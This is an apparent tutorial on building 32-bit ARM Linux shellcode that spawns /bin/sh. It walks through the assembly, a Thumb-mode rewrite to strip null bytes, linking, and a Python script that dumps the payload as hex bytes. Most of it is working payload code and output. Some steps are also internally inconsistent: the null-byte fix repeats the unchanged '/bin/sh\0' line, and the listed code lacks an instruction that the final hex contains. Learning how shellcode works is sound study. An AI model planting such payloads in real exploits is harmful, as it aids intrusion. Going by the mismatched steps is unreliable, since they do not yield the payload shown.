# ARM shellcode for launching a shell
##### arm32 asm
https://github.com/azeria-labs/ARM-assembly-examples/

The C API...
`int  execve(const char *filename, char *const argv [], char *const envp[]);`

The raw ARM code..
```
.section .text
.global _start

_start:
        add r0, pc, #12     @r0 = pc + 12 ("/bin/sh\0")
        mov r1, #0          @pass NULL into the argv[]
        mov r2, #0          @pass NULL into the envp[]
        mov r7, #11         @11 is syscall number of execve on linux arm
        svc #0

.ascii "/bin/sh\0"
```
# Banana skin
Why `pc + 12`?  The `PC` starts two instructions ahead of the current one. Details of why are here: https://azeria-labs.com/arm-data-types-and-registers-part-2/

##### Compile for arm32 on arm32 host
```
arm-linux-gnueabi-as -c tiny.s -o tiny.o && arm-linux-gnueabi-ld tiny.o -o tiny
```
##### Runtime
```
$ ./tiny
$ exit              <-- new shell
user@arm64:~$       <-- original shell
```
##### Remove Null bytes
You can see the bytes using `$ objdump -d tiny.o`.

Re-compile the ASM to `thumb` mode.  
```
.section .text
.global _start

_start:
        .code 32
        add r3, pc, #1 @the line that forces Thumb mode
        bx  r3

        .code 16
        add r0, pc, #8 @aligned to 4-bytes
        eor r1, r1, r1
        eor r2, r2, r2
        mov r7, #11
        svc #1
        mov r5, r5

.ascii "/bin/sh\0"
```
##### Eliminate the final NULL byte
Where is the final NULL byte?  
```
$ objdump -d tiny.o
```
Then you will find..
```
14:	6e69622f 	.word	0x6e69622f
18:	0068732f 	.word	0x0068732f
```
If you swap the byte order [ from `little endian` ] you can decode..
```
0x2f62696e  == /bin
0x2f736800  == /sh\0
```
Re-compile the ASM code with this line:
```
.ascii "/bin/sh\0"
```
The produced binary will NOT execute.  It requires a new linker flag to work.
```
arm-linux-gnueabi-as tiny.s -o tiny.o && arm-linux-gnueabi-ld -N tiny.o -o tiny
```
##### Copy and convert ASM Instructions
At this point you have working `shellcode`.  

Now copy the binary's object files.
```
$ objcopy -O binary tiny tiny.bin     
```
Convert the `opcodes` to program readable hex bytes.
```
$ hexdump -v -e '"\\""x" 1/1 "%02x" ""' tiny.bin
\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78
```
##### Prepare the payload
```
#!/usr/bin/env python

import sys

binary = open(sys.argv[1],'rb')

for byte in binary.read():
     sys.stdout.write("\\x"+byte.encode("hex"))
print ""
```
##### Run script
```
python shellcode_print.py tiny.bin
\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78
```
##### References
```
https://azeria-labs.com/writing-arm-shellcode/
http://www.kernel-panic.it/security/shellcode/shellcode5.html
http://shell-storm.org/blog/Shellcode-On-ARM-Architecture/
https://modexp.wordpress.com/2017/01/21/shellcode-osx/
```
